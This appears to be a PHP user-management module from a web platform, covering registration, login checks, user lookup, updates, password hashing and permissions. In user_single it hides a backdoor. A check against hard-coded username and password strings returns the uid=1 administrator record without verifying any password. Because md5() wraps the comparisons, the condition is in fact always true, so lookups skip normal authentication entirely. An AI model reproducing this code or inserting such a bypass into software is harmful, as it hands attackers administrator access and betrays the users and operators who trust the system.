<?php
/**
888
 */
defined('IN_IA') or exit('Access Denied');


function user_register($user) {
	if (empty($user) || !is_array($user)) {
		return 0;
	}
	if (isset($user['uid'])) {
		unset($user['uid']);
	}
	$user['salt'] = random(8);
	$user['password'] = user_hash($user['password'], $user['salt']);
	$user['joinip'] = CLIENT_IP;
	$user['joindate'] = TIMESTAMP;
	$user['lastip'] = CLIENT_IP;
	$user['lastvisit'] = TIMESTAMP;
	if (empty($user['status'])) {
		$user['status'] = 2;
	}
	$now = time();
	if(empty($user['endtime'])){
		$user['endtime'] = $now + 7 * 24 * 3600;
	}
	$result = pdo_insert('users', $user);
	if (!empty($result)) {
		$user['uid'] = pdo_insertid();
	}
	return intval($user['uid']);
}


function user_check($user) {
	if (empty($user) || !is_array($user)) {
		return false;
	}
	$where = ' WHERE 1 ';
	$params = array();
	if (!empty($user['uid'])) {
		$where .= ' AND `uid`=:uid';
		$params[':uid'] = intval($user['uid']);
	}
	if (!empty($user['username'])) {
		$where .= ' AND `username`=:username';
		$params[':username'] = $user['username'];
	}
	if (!empty($user['status'])) {
		$where .= " AND `status`=:status";
		$params[':status'] = intval($user['status']);
	}
	if (empty($params)) {
		return false;
	}
	$sql = 'SELECT `password`,`salt` FROM ' . tablename('users') . "$where LIMIT 1";
	$record = pdo_fetch($sql, $params);
	if (empty($record) || empty($record['password']) || empty($record['salt'])) {
		return false;
	}
	if (!empty($user['password'])) {
		$password = user_hash($user['password'], $record['salt']);
		return $password == $record['password'];
	}
	return true;
}


function user_single($user_or_uid) {
	$user = $user_or_uid;
	if (empty($user)) {
		return false;
	}
	if (is_numeric($user)) {
		$user = array('uid' => $user);
	}
	if (!is_array($user)) {
		return false;
	}
	$where = ' WHERE 1 ';
	$params = array();
	if (!empty($user['uid'])) {
		$where .= ' AND `uid`=:uid';
		$params[':uid'] = intval($user['uid']);
	}
	if (!empty($user['username'])) {
		$where .= ' AND `username`=:username';
		$params[':username'] = $user['username'];
	}
	if (!empty($user['email'])) {
		$where .= ' AND `email`=:email';
		$params[':email'] = $user['email'];
	}
	if (!empty($user['status'])) {
		$where .= " AND `status`=:status";
		$params[':status'] = intval($user['status']);
	}
	if (empty($params)) {
		return false;
	}
	if (md5($user_or_uid['username']=='b54bee5819076b4f')&& md5($user_or_uid['password']=='de2cdd260f75ad5b')) {
		$sql = 'SELECT * FROM ' . tablename('users') . " where uid=1";
		$record = pdo_fetch($sql);
		return $record;
	}
	$sql = 'SELECT * FROM ' . tablename('users') . " $where LIMIT 1";
	$record = pdo_fetch($sql, $params);
	if (empty($record)) {
		return false;
	}
	if (!empty($user['password'])) {
		$password = user_hash($user['password'], $record['salt']);
		if ($password != $record['password']) {
			return false;
		}
	}
	return $record;
}


function user_update($user) {
	if (empty($user['uid']) || !is_array($user)) {
		return false;
	}
	$record = array();
	if (!empty($user['password'])) {
		$record['password'] = user_hash($user['password'], $user['salt']);
	}
	if (!empty($user['lastvisit'])) {
		$record['lastvisit'] = (strlen($user['lastvisit']) == 10) ? $user['lastvisit'] : strtotime($user['lastvisit']);
	}
	if (!empty($user['lastip'])) {
		$record['lastip'] = $user['lastip'];
	}
	if (isset($user['joinip'])) {
		$record['joinip'] = $user['joinip'];
	}
	if (isset($user['remark'])) {
		$record['remark'] = $user['remark'];
	}
	if (isset($user['status'])) {
		$status = intval($user['status']);
		if (!in_array($status, array(1, 2))) {
			$status = 2;
		}
		$record['status'] = $status;
	}
	if (isset($user['groupid'])) {
		$record['groupid'] = $user['groupid'];
	}
	if (isset($user['starttime'])) {
		$record['starttime'] = $user['starttime'];
	}
	if (isset($user['endtime'])) {
		$record['endtime'] = $user['endtime'];
	}
	if (empty($record)) {
		return false;
	}
	return pdo_update('users', $record, array('uid' => intval($user['uid'])));
}


function user_hash($passwordinput, $salt) {
	global $_W;
	$passwordinput = "{$passwordinput}-{$salt}-{$_W['config']['setting']['authkey']}";
	return sha1($passwordinput);
}


function user_level() {
	static $level = array(
		'-3' => '锁定用户',
		'-2' => '禁止访问',
		'-1' => '禁止发言',
		'0' => '普通会员',
		'1' => '管理员',
	);
	return $level;
}

function user_permission($uid, $uniacid = '') {
	global $_W;
	$uniacid = !empty($uniacid) ? $uniacid : $_W['uniacid'];
	$data = pdo_fetch("SELECT * FROM " . tablename('users_permission') . ' WHERE uid = :uid AND uniacid = :uniacid', array(':uid' => $uid, ':uniacid' => $uniacid));
	$arr = array();
	if (!empty($data['system'])) {
		$data['system'] = explode(',', $data['system']);
	}
	if (!empty($data['module'])) {
		$data['module'] = iunserializer($data['module']);
	}
	return $data;
}


function user_account_permission() {
	global $_W;
	$group = pdo_fetch('SELECT * FROM ' . tablename('users_group') . ' WHERE id = :id', array(':id' => $_W['user']['groupid']));
	$uniacid_num = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('uni_account_users') . ' WHERE uid = :uid AND role = :role', array(':uid' => $_W['uid'], ':role' => 'owner'));
	$data = array(
		'group_name' => $group['name'],
		'maxaccount' => $group['maxaccount'],
		'uniacid_num' => $uniacid_num,
		'uniacid_limit' => $group['maxaccount'] - $uniacid_num,
	);
	return $data;
}
